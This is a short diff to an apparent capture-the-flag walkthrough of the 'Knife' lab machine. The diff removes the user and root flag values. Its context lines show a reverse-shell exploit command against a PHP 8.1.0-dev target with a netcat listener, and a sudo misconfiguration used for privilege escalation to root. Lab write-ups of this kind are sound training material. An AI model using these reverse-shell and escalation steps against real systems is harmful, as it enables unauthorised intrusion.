@@ -33,7 +33,7 @@ sudo python3 revshell_php_8.1.0-dev.py http://10.10.10.242/ 10.10.14.21 4444
 
 [+]PRIVILAGE ESCALATION[+]
 james@knife:~$ cat user.txt
-2678402e153577036cba11ebfc36108d
+
 
 james@knife:~$ sudo -l
 ROOT (NOPASSWD) /usr/bin/knife
@@ -51,4 +51,4 @@ sudo nc -lvnp $PORT
 whoami
 root
 cat /root/root.txt
-8a8b314fbb7b1deda33164f8d04e70c7
+
